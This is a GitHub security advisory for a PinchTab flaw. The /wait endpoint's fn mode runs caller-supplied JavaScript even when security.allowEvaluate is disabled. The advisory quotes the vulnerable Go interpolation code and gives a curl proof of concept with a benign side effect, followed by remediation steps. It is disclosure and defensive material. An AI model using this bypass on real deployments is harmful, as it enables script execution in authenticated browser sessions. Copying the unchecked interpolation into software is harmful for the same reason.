# [M] A PinchTab Security Policy Bypass in /wait Allows Arbitrary JavaScript Execution

## Summary
Severity: Medium
Advisory: GHSA-w5pc-m664-r62v
CVE: CVE-2026-33622
CWE: CWE-284, CWE-693, CWE-94
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:L/VI:L/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-w5pc-m664-r62v
Type: github-advisory

## Affected
- Go: `github.com/pinchtab/pinchtab/cmd/pinchtab` — affected >=0.8.3
- Go: `github.com/pinchtab/pinchtab` — affected >=0.8.3

## Details
### Summary
PinchTab `v0.8.3` through `v0.8.5` allow arbitrary JavaScript execution through `POST /wait` and `POST /tabs/{id}/wait` when the request uses `fn` mode, even if `security.allowEvaluate` is disabled.

`POST /evaluate` correctly enforces the `security.allowEvaluate` guard, which is disabled by default. However, in the affected releases, `POST /wait` accepted a user-controlled `fn` expression, embedded it directly into executable JavaScript, and evaluated it in the browser context without checking the same policy.

This is a security-policy bypass rather than a separate authentication bypass. Exploitation still requires authenticated API access, but a caller with the server token can execute arbitrary JavaScript in a tab context even when the operator explicitly disabled JavaScript evaluation.

The current worktree fixes this by applying the same policy boundary to `fn` mode in `/wait` that already exists on `/evaluate`, while preserving the non-code wait modes.

### Details
**Issue 1 — `/evaluate` enforced the guard, `/wait` did not (`v0.8.3` through `v0.8.5`):**
The dedicated evaluate endpoint rejected requests when `security.allowEvaluate` was disabled:

```go
// internal/handlers/evaluate.go — v0.8.5
func (h *Handlers) evaluateEnabled() bool {
    return h != nil && h.Config != nil && h.Config.AllowEvaluate
}

func (h *Handlers) HandleEvaluate(w http.ResponseWriter, r *http.Request) {
    if !h.evaluateEnabled() {
        httpx.ErrorCode(w, 403, "evaluate_disabled", httpx.DisabledEndpointMessage("evaluate", "security.allowEvaluate"), false, map[string]any{
            "setting": "security.allowEvaluate",
        })
        return
    }
    // ...
}
```

In the same releases, `/wait` did not apply that guard before evaluating `fn`:

```go
// internal/handlers/wait.go — v0.8.5 (vulnerable)
func (h *Handlers) handleWaitCore(w http.ResponseWriter, r *http.Request, req waitRequest) {
    mode := req.mode()
    if mode == "" {
        httpx.Error(w, 400, fmt.Errorf("one of selector, text, url, load, fn, or ms is required"))
        return
    }

    // No evaluateEnabled() check here in affected releases
    // ...
}
```

**Issue 2 — `fn` mode evaluated caller-supplied JavaScript directly:**
The `fn` branch built executable JavaScript from the request field and passed it to `chromedp.Evaluate`:

```go
// internal/handlers/wait.go — v0.8.5 (vulnerable)
case "fn":
    js = fmt.Sprintf(`!!(function(){try{return %s}catch(e){return false}})()`, req.Fn)
    matchLabel = "fn"

// Poll loop
evalErr := chromedp.Run(tCtx, chromedp.Evaluate(js, &result))
```

Because `req.Fn` was interpolated directly into evaluated JavaScript, a caller could supply expressions with side effects, not just passive predicates.

**Issue 3 — Current worktree contains an unreleased fix:**
The current worktree closes this gap by making `fn` mode in `/wait` respect the same `security.allowEvaluate` policy boundary that `/evaluate` already enforced. The underlying non-code wait modes remain available.

### PoC
**Prerequisites**

- PinchTab `v0.8.3`, `v0.8.4`, or `v0.8.5`
- A configured API token
- `security.allowEvaluate = false`
- A reachable tab context, created by the caller or already present

**Step 1 — Confirm `/evaluate` is blocked by policy**

```bash
curl -s -X POST http://localhost:9867/evaluate \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"expression":"1+1"}'
```

Expected:

```json
{
  "code": "evaluate_disabled"
}
```

**Step 2 — Open a tab**

```bash
curl -s -X POST http://localhost:9867/navigate \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://example.com"}'
```

Example result:

```json
{
  "tabId": "<TAB_ID>",
  "title": "Example Domain",
  "url": "https://example.com/"
}
```

**Step 3 — Execute JavaScript through `/wait` using `fn` mode**

```bash
curl -s -X POST http://localhost:9867/wait \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "tabId":"<TAB_ID>",
    "fn":"(function(){window._poc_executed=true;return true})()",
    "timeout":5000
  }'
```

Example result:

```json
{
  "waited": true,
  "elapsed": 1,
  "match": "fn"
}
```

**Step 4 — Verify the side effect**

```bash
curl -s -X POST http://localhost:9867/wait \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "tabId":"<TAB_ID>",
    "fn":"window._poc_executed === true",
    "timeout":3000
  }'
```

Example result:

```json
{
  "waited": true,
  "elapsed": 0,
  "match": "fn"
}
```

**Observation**
1. `/evaluate` returns `evaluate_disabled` when `security.allowEvaluate` is off.
2. `/wait` still evaluates caller-supplied JavaScript through `fn` mode in the affected releases.
3. The first `/wait` request introduces a side effect in page state.
4. The second `/wait` request confirms that the side effect occurred, demonstrating arbitrary JavaScript execution despite the disabled evaluate policy.

### Impact
1. Bypass of the explicit `security.allowEvaluate` control in `v0.8.3` through `v0.8.5`.
2. Arbitrary JavaScript execution in the reachable browser tab context for callers who already possess the server API token.
3. Ability to read or modify page state and act within authenticated browser sessions available to that tab context.
4. Inconsistent security boundaries between `/evaluate` and `/wait`, making the configured execution policy unreliable.
5. This is not an unauthenticated issue. Practical risk depends on who can access the API and whether the deployment exposes tabs containing sensitive authenticated state.

### Suggested Remediation
1. Make `fn` mode in `/wait` enforce the same policy check as `/evaluate`.
2. Keep non-code wait modes available when JavaScript evaluation is disabled.
3. Add regression coverage so the policy boundary remains consistent across endpoints.

## References
- https://github.com/pinchtab/pinchtab/security/advisories/GHSA-w5pc-m664-r62v
- https://nvd.nist.gov/vuln/detail/CVE-2026-33622
- https://github.com/pinchtab/pinchtab
